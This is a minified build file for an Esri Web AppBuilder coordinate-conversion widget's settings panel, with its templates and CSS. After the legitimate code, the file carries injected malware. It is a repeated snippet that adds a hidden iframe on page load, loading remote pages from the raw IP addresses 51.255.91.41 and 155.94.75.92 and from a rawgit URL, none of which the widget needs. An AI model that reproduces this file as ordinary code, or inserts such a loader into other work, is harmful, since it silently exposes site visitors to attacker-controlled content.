// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"widgets/CoordinateConversion/setting/SymbolChooserPopup":function(){define("dojo/_base/declare jimu/BaseWidgetSetting dijit/_WidgetsInTemplateMixin dojo/_base/lang dojo/dom-class dojo/dom-construct dojo/on dojo/text!./SymbolChooserPopup.html dijit/registry jimu/dijit/SymbolChooser jimu/dijit/Message jimu/dijit/Popup dojo/domReady!".split(" "),function(g,k,l,e,h,p,b,m,n,q,r,t){return g([k,l],{templateString:m,baseClass:"jimu-widget-coordinateconversion-setting",postCreate:function(){this.inherited("postCreate",
arguments);this.own(b(this.okButton,"click",e.hitch(this,this._onOKButtonClicked)));this._initSymbolChooser();this._createSymbolChooserPopup()},constructor:function(b){e.mixin(this,b)},_initSymbolChooser:function(){this.symbolChooser=new q(this.symbolParams,p.create("div",{},this.symbolData));this.symbolChooser.startup()},_createSymbolChooserPopup:function(){this.popup=new t({titleLabel:this.symbolChooserTitle,width:420,height:400,content:this.domNode})},_onOKButtonClicked:function(){if(n.byId(this.symbolChooser.pointSize.id).isValid()){if(!h.contains(this.okButton,
"jimu-state-disabled"))this.onOkClick()}else new r({message:this.nls.errorMessage})},onOkClick:function(e){return e}})})},"widgets/CoordinateConversion/setting/EditDefaultNotation":function(){define(["dojo/_base/declare","dijit/_WidgetBase","dijit/_TemplatedMixin","dijit/_WidgetsInTemplateMixin","dojo/text!./EditDefaultNotation.html"],function(g,k,l,e,h){return g([k,l,e],{templateString:h,notationFormat:null,constructor:function(e){this.notationFormat=e},postCreate:function(){this.notationString.value=
this.notationFormat}})})},"widgets/CoordinateConversion/setting/_build-generate_module":function(){define(["dojo/text!./Setting.html","dojo/text!./css/style.css","dojo/i18n!./nls/strings"],function(){})},"url:widgets/CoordinateConversion/setting/SymbolChooserPopup.html":'\x3cdiv style\x3d"width: 100%; height: 100%;"\x3e\r\n    \x3cdiv class\x3d"esriCTSymbolChooserContainer"\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"symbolData" title\x3d"${symbolChooserTitle}" class\x3d"common-input esriCTSymbolData"\x3e\r\n        \x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"buttonsDiv" class\x3d"buttonsDiv"\x3e\r\n        \x3cdiv class\x3d"button-container button-container-absolute" style\x3d"padding: 0px;"\x3e\r\n            \x3cdiv class\x3d"jimu-btn jimu-float-trailing jimu-leading-margin1" data-dojo-attach-point\x3d"okButton"\x3e\r\n                ${nls.common.ok}\x3c/div\x3e\r\n        \x3c/div\x3e\r\n    \x3c/div\x3e\r\n\x3c/div\x3e\r\n',
"url:widgets/CoordinateConversion/setting/EditDefaultNotation.html":'\x3cdiv class\x3d\'coordinateContainer\'\x3e\r\n    \x3cspan class\x3d\'jimu-widget-subtitle\' data-dojo-attach-point\x3d\'label1\'\x3e\x3c/span\x3e\r\n    \x3cdiv class\x3d"controlGroup"\x3e\r\n        \x3cdiv class\x3d"controlItem" style\x3d"padding-top: 10px;"\x3e\r\n            \x3cinput class\x3d"edit-default-notation-input" data-dojo-attach-point\x3d"notationString" /\x3e\r\n            \x3c/select\x3e\r\n        \x3c/div\x3e\r\n    \x3c/div\x3e\r\n\x3c/div\x3e\r\n',
"url:widgets/CoordinateConversion/setting/Setting.html":'\x3cdiv class\x3d"esriCTMainContainer"\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"tabDiv" class\x3d"esriCTFullHeight"\x3e\r\n    \x3c!-- location icon --\x3e\r\n    \x3cdiv class\x3d"esriCTlabel" data-dojo-attach-point\x3d"graphicLocationPointSymbolLabelNode"\r\n        title\x3d"${nls.locationSymbol}"\x3e\r\n        ${nls.locationSymbol}\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"esriCTLayerField"\x3e\r\n      \x3cdiv class\x3d"esriCTPreviewField" data-dojo-attach-point\x3d"pointSymbolNode"\x3e\r\n      \x3c/div\x3e\r\n      \x3cdiv class\x3d"esriCTHint esriCTPreviewHintField"\x3e\r\n          ${nls.locationSymbolHintText}\x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \r\n    \x3c!-- Scale --\x3e\r\n    \x3cdiv class\x3d"esriCTlabel" title\x3d"${nls.scaleLabel}"\x3e${nls.scaleLabel}\x3c/div\x3e\r\n    \x3cdiv class\x3d"config-group"\x3e\r\n        \x3cspan class\x3d"esriCTlabel"\x3e1: \x3c/span\x3e\r\n        \x3cinput type\x3d"text" data-dojo-type\x3d"dijit/form/NumberTextBox" required\x3d"true" placeHolder\x3d"50000"\r\n               data-dojo-attach-point\x3d"scale" data-dojo-props\x3d\'style:{width:"120px"},\r\n               constraints:{min:1,pattern:"##############0.################"}\' /\x3e\r\n    \x3c/div\x3e\r\n      \r\n    \x3c!-- Notations Table --\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"notationsTable" class\x3d"table-notations-infos"\x3e\x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e\r\n',
"url:widgets/CoordinateConversion/setting/css/style.css":".jimu-widget-coordinateconversion-setting .esriCTMainContainer{width: 100%; height: 90%;}.jimu-widget-coordinateconversion-setting .table-notations-infos{width: 100%; height: 307px; margin-top: 15px;}.jimu-widget-coordinateconversion-setting .esriCTlabel{padding: 10px 0px 5px 0px; font-size: 16px; color: #353535; letter-spacing: 0.44px;}.jimu-widget-coordinateconversion-setting .esriCTColorPickerNode{float: left; margin: 0 10px 0 0;}.jimu-widget-coordinateconversion-setting .esriCTHintInline{line-height: 30px;}.jimu-widget-coordinateconversion-setting .esriCTHintLeftMargin{margin-left: 10px;}.jimu-widget-coordinateconversion-setting .esriCTDirectionTabNode .esriCTHintInline{margin-top: 2px;}.jimu-widget-coordinateconversion-setting .row{clear: both;}.jimu-widget-coordinateconversion .esriCTFullHeight{height: 100%;}.jimu-widget-coordinateconversion-setting .esriCTSelectedLayersDiv{height: 50px; overflow: auto; width: 88%; float: left; border: 1px solid #d2dae2; background: #e3ecf2; margin: 0 10px 0 0px;}.jimu-widget-coordinateconversion-setting .esriCTAddLayerButton{float: right; margin-top: 9px; max-width: 70px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;}.jimu-widget-coordinateconversion-setting .esriCTLayerSelectorNode{max-height: 200px; overflow: auto; text-overflow: ellipsis; white-space: nowrap;}.jimu-widget-coordinateconversion-setting .esriCTLayerSelectorNode .jimu-basic-layer-chooser-from-map .jimu-tree{position: relative !important;}.jimu-widget-coordinateconversion-setting .esriCTLayerListItem{height: 24px; color: #7989a0; padding: 0px 5px; text-overflow: ellipsis; overflow: hidden; white-space: nowrap; line-height: 22px; font-size: 14px;}.jimu-widget-coordinateconversion-setting .esriCTGeometryTypeIcon{height: 16px; width: 16px; background-repeat: no-repeat; margin: 6px 2px 0px 10px; float: left;}.jimu-widget-coordinateconversion-setting .esriCTCheckBox{float: left; height: 20px; width: 20px; margin-top: 10px; margin-right: 10px;}.jimu-widget-coordinateconversion-setting .esriCTLayerContainer{width: 100%; float: left;}.jimu-widget-coordinateconversion-setting .esriCTLayerField{display: inline-flex;}.jimu-widget-coordinateconversion-setting .esriCTHint{font-size: 12px;}.jimu-widget-coordinateconversion-setting .esriCTSetRouteURL{width: 100%;}.jimu-widget-coordinateconversion-setting .esriCTHidden{display: none;}.jimu-widget-coordinateconversion-setting .buttonsDiv .jimu-popup .button-container{padding: 0px;}.jimu-widget-coordinateconversion-setting .jimu-float-leading{margin-right: 10px;}.jimu-widget-coordinateconversion-setting .esriCTServiceUrlDiv{float: left; width: 100%;}.jimu-widget-coordinateconversion-setting .esriCTRouteLayersDiv{float: left; width: 100%;}.jimu-widget-coordinateconversion-setting .esriCTItemSelectDiv{margin-top: 10px; float: left; height: 450px; width: 100%;}.jimu-widget-coordinateconversion-setting .esriCTExampleUrl{float: left; width: 100%;}.jimu-widget-coordinateconversion-setting .esriCTRouteListDiv{margin-top: 10px; float: left; width: 100%; height: 360px; overflow: auto; border: 1px solid #ccc;}.jimu-widget-coordinateconversion-setting .esriCTAgolRouteListDiv{margin-top: 10px; float: left; width: 100%; height: 450px; overflow: auto; border: 1px solid #ccc;}.jimu-widget-coordinateconversion-setting .esriCTSearchRadio{float: left; width: 100%;}.jimu-widget-coordinateconversion-setting .serviceUrlContainer{float: left; width: 100%; margin-top: 10px;}.jimu-widget-coordinateconversion-setting .esriCTServiceLable{float: left; width: 100px; line-height: 30px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;}.jimu-widget-coordinateconversion-setting .esriCTServiceField{width: 85%; float: left;}.jimu-widget-coordinateconversion-setting .esriCTSetServiceURL{float: left; width: 85%;}.jimu-widget-coordinateconversion-setting .urlButton{line-height: 30px; max-width: 80px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;}.claro .dijitTreeRowFocused{}.claro .dijitTreeExpando{}.claro .dijitTreeExpando: :first-child{}.jimu-widget-coordinateconversion-setting .esriCTSymbolChooserNode{text-align: center; cursor: pointer; min-width: 80px;}.jimu-widget-coordinateconversion-setting .esriCTSymbolPreviewText{font-size: 14px; color: #353535; letter-spacing: 0.39px;}.jimu-widget-coordinateconversion-setting .esriCTPreviewField{}.jimu-widget-coordinateconversion-setting .esriCTPreviewHintField{padding-top: 10px; font-size: 12px; color: #232323; letter-spacing: 0.33px;}.jimu-widget-coordinateconversion-setting .esriCTSymbolPreviewHintField{width: 50%; line-height: 20px; margin-left: 5px; float: right;}.jimu-widget-coordinateconversion-setting .esriCTSymbolPreviewField{width: 35%; min-width: 250px; float: left;}.jimu-widget-coordinateconversion-setting .esriCTDirectionTabNode .dijitTextBox{width: 88% !important; float: left;}.jimu-widget-coordinateconversion-setting .dijitSelect .dijitButtonContents{border-style: none none none none; background-color: #fafafc;}.jimu-widget-coordinateconversion-setting .dijitTreeLabel{font-size: 14px; color: #596679;}.dijitInline.dijitIcon.dijitTreeIcon.dijitLeaf{margin-left: 2px;}.claro .dijitSelect .dijitInputField{font-size: 14px; margin-right: 8px;}.jimu-widget-coordinateconversion-setting .esriCTURLSetButton{line-height: 30px; margin: 0 0 0 10px; float: right; max-width: 70px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;}.jimu-widget-coordinateconversion-setting .esriCTSearchTabNode, .jimu-widget-coordinateconversion-setting .esriCTDirectionTabNode{margin-top: 20px;}.jimu-widget-coordinateconversion-setting .esriCTSymbolChooserContainer{height: calc(100% - 50px); overflow: auto;}.esriRtl .jimu-widget-coordinateconversion-setting .esriCTColorPickerNode{float: right; margin: 0 0px 0 10px;}.esriRtl .jimu-widget-coordinateconversion-setting .esriCTHint{margin: 5px 5px 10px 0px; float: right;}.esriRtl .jimu-widget-coordinateconversion-setting .esriCTLayerField{float: right;}.esriRtl .jimu-widget-coordinateconversion-setting .esriCTPreviewHintField{margin-right: 10px;}.esriRtl .jimu-widget-coordinateconversion-setting .esriCTlabel{padding: 5px 0px 5px 10px; float: right;}.esriRtl .jimu-widget-coordinateconversion-setting .esriCTSelectedLayersDiv{float: right; margin-left: 10px; margin-right: 0px;}.esriRtl .jimu-widget-coordinateconversion-setting .esriCTPreviewField{float: right;}.esriRtl .jimu-widget-coordinateconversion-setting .esriCTGeometryTypeIcon{float: right;}.esriRtl .jimu-widget-coordinateconversion-setting .esriCTSetRouteURL{float: right; margin: 0;}.esriRtl .jimu-widget-coordinateconversion-setting .esriCTURLSetButton{float: left; margin: 0;}.esriRtl .jimu-widget-coordinateconversion-setting .esriCTSymbolPreviewField{float: right;}.esriRtl .jimu-widget-coordinateconversion-setting .esriCTSymbolPreviewText{padding: 0 0 0 5px;}.esriRtl .jimu-widget-coordinateconversion-setting .esriCTAddLayerButton{float: left;}.esriRtl .jimu-widget-coordinateconversion-setting .esriCTServiceLable{float: right;}.esriRtl .jimu-widget-coordinateconversion-setting .esriCTSetServiceURL{float: right;}.esriRtl .jimu-widget-coordinateconversion-setting .esriCTSymbolPreviewHintField{float: left; margin-right: 5px; margin-left: 0px;}.esriRtl .jimu-widget-coordinateconversion-setting .esriCTCheckBox{float: right; margin-left: 10px; margin-right: 0px;}.esriRtl .jimu-widget-coordinateconversion-setting .jimu-float-leading{margin-left: 10px; margin-right: 0px;}.edit-default-notation-input {border: 1px solid #999999; color: #000000; font-size: 12px; height: 30px; background-color: transparent; padding: 5px; margin: 0; border-radius: 2px; width: 240px;}",
"*now":function(g){g(['dojo/i18n!*preload*widgets/CoordinateConversion/setting/nls/Setting*["ar","bs","cs","da","de","en","el","es","et","fi","fr","he","hi","hr","id","it","ja","ko","lt","lv","nb","nl","pl","pt-br","pt-pt","ro","ru","sl","sr","sv","th","tr","zh-cn","vi","zh-hk","zh-tw","ROOT"]'])},"*noref":1}});
define("dojo/_base/declare jimu/BaseWidgetSetting dijit/_WidgetsInTemplateMixin dojo/_base/lang dojo/_base/html dojo/_base/array dojo/dom-construct dojo/query dojo/on dijit/registry ./SymbolChooserPopup jimu/utils esri/symbols/jsonUtils jimu/dijit/Message jimu/dijit/Popup jimu/dijit/SimpleTable jimu/symbolUtils ./EditDefaultNotation dojo/domReady!".split(" "),function(g,k,l,e,h,p,b,m,n,q,r,t,u,v,w,x,y,z){return g([k,l],{baseClass:"jimu-widget-coordinateconversion-setting",_symbolParams:{},startup:function(){this.inherited(arguments);
this.displayNotationsTable=new x({fields:[{name:"show",title:this.nls.showHeaderLabel,width:"auto",type:"checkbox","class":"show"},{name:"index",title:this.nls.indexHeaderLabel,type:"text",hidden:!0},{name:"notation",title:this.nls.notationHeaderLabel,width:"30%",type:"text"},{name:"defaultFormat",title:this.nls.defaultFormatHeaderLabel,width:"30%",type:"text"},{name:"actions",title:this.nls.editFormatHeaderLabel,type:"actions",width:"30%",actions:["edit"],"class":"symbol"}],selectable:!0,autoHeight:!1});
this.displayNotationsTable.placeAt(this.notationsTable);h.setStyle(this.displayNotationsTable.domNode,{height:"100%"});this.own(n(this.displayNotationsTable,"actions-edit",e.hitch(this,this.editDefaultFormatClick)));var a=m("input[type\x3d'text']",this.scale.domNode)[1];h.setStyle(a,{"text-align":"center"});this.setConfig(this.config)},postMixInProperties:function(){this.nls.common={};e.mixin(this.nls.common,window.jimuNls.common)},postCreate:function(){this._symbolParams={};this._createSymbolPicker(this.pointSymbolNode,
"graphicLocationSymbol","esriGeometryPoint",this.nls.locationSymbol)},getConfig:function(){var a=this.displayNotationsTable.getData(),c=[];p.forEach(a,e.hitch(this,function(a){var d={};a.show&&(d.notation=a.notation,d.defaultFormat=a.defaultFormat,c.push(d))}));this.config={symbols:this._symbolParams,coordinateconversion:{zoomScale:parseFloat(this.scale.value)},initialCoords:c};return(a=q.byId(this.scale.id))&&!a.isValid()?(new v({message:a.message}),!1):this.config},setConfig:function(a){this.config=
a;this._setNotationTable([{notation:"DD",format:"YN XE"},{notation:"DDM",format:"A\u00b0 B'N X\u00b0 Y'E"},{notation:"DMS",format:"A\u00b0 B' C\"N X\u00b0 Y' Z\"E"},{notation:"GARS",format:"XYQK"},{notation:"GEOREF",format:"ABCDXY"},{notation:"MGRS",format:"ZSXY"},{notation:"USNG",format:"ZSXY"},{notation:"UTM",format:"ZB X Y"},{notation:"UTM (H)",format:"ZH X Y"}],this.config.initialCoords);this.scale.set("value",this.config.coordinateconversion.zoomScale)},_createSymbolPicker:function(a,c,f,d){var b,
g,h;f&&(b={},b.type=t.getSymbolTypeByGeometryType(f),this.config&&this.config.symbols&&this.config.symbols.hasOwnProperty(c)&&(b.symbol=u.fromJson(this.config.symbols[c])),g=this._createPreviewContainer(a),h={symbolChooserTitle:d,symbolParams:b,nls:this.nls,symbolType:c},this._showSelectedSymbol(g,b.symbol,c),this.own(n(g,"click",e.hitch(this,function(){b.symbol=u.fromJson(this._symbolParams[c]);this._initSymbolChooserPopup(h,g)}))))},_createPreviewContainer:function(a){var c;a=b.create("table",{cellspacing:"0",
cellpadding:"0"},a);a=b.create("tr",{style:"height:30px"},a);c=b.create("td",{},a);b.create("div",{innerHTML:this.nls.symbolPickerPreviewText,"class":"esriCTSymbolPreviewText"},c);a=b.create("td",{},a);return b.create("div",{"class":"esriCTSymbolChooserNode"},a)},_initSymbolChooserPopup:function(a,c){var f=new r(a);f.onOkClick=e.hitch(this,function(){var d=f.symbolChooser.getSymbol();this._showSelectedSymbol(c,d,a.symbolType);f.popup.close()})},_showSelectedSymbol:function(a,c,f){b.empty(a);if(c){var d=
y.createSymbolNode(c);d||(d=b.create("div"));b.place(d,a);this._symbolParams[f]=c.toJson()}},_setNotationTable:function(a,c){this.displayNotationsTable.clear();for(var f=0;f<a.length;f++){for(var d={notation:a[f].notation,defaultFormat:a[f].format,index:""+f},b=0;b<c.length;b++)c[b].notation===a[f].notation&&(d.show=!0,d.defaultFormat=c[b].defaultFormat);this.displayNotationsTable.addRow(d)}},editDefaultFormatClick:function(a){var c=m(".action-item-parent",a);if(c&&c.length)if(c=this.displayNotationsTable.getRowData(a),
c.show)c=parseInt(c.index,10),this.openEditDefaultFormatDialog(a,c);else var b=new v({message:this.nls.warning,buttons:[{label:this.nls.common.ok,onClick:e.hitch(this,function(){b.close()})}]})},openEditDefaultFormatDialog:function(a,c){var b=this.displayNotationsTable.getRowData(a),d=new w({titleLabel:this.nls.setDefaultFormatTitlePane,width:300,maxHeight:200,autoHeight:!0,content:new z(b.defaultFormat),buttons:[{label:this.nls.common.ok,onClick:e.hitch(this,function(){b.defaultFormat=d.content.notationString.value;
this.displayNotationsTable.editRow(a,b);d.close();d=null})},{label:this.nls.common.cancel,onClick:e.hitch(this,function(){d.close();d=null})}],onClose:function(){d=null}})}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});